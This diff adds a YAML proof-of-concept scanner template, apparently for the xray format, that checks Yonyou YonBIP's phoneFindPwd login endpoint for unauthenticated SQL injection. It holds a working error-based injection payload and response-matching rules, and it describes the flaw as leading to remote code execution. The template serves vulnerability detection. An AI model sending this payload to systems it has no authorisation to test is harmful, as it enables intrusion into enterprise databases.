@@ -1,0 +1,18 @@
+name: poc-yaml-yonyou-yonbip-phoneFindPwd-sqli
+groups:
+  sqli:
+    - method: POST
+      path: /nccloud/yonbip/login/phoneFindPwd
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        phone=1' AND 1=CONVERT(int,(SELECT @@version))--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"Microsoft SQL Server") || response.body.bcontains(b"ODBC") || response.body.bcontains(b"Conversion failed") || response.body.bcontains(b"SQL"))
+detail:
+  author: L4xy
+  description: "用友YonBIP高级版存在SQL注入漏洞，攻击者无需身份认证，通过phoneFindPwd接口构造恶意请求可触发SQL注入，执行非预期数据库查询，可导致远程代码执行"
+  links:
+    - https://www.ufida168.com/case_detail/3470.html
+  tags: sqli,yonyou,yonbip
